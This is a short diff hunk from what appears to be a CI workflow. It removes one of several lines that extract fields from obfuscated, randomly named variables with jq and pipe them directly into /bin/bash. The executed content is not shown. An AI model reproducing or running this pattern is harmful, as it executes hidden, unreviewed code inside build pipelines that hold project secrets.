@@ -43,7 +43,6 @@ jobs:
           echo $tldq6473 | jq -r .ux39 | /bin/bash
           echo $iybz2824 | jq -r .gnasb6912 | /bin/bash
           printf '%s' "$zi1" | jq -r .nquvj148 | /bin/bash
-          echo $dfq2 | jq -r .xts17 | /bin/bash
           echo $gl540 | jq -r .mni00330 | /bin/bash
 
       - name: Store results
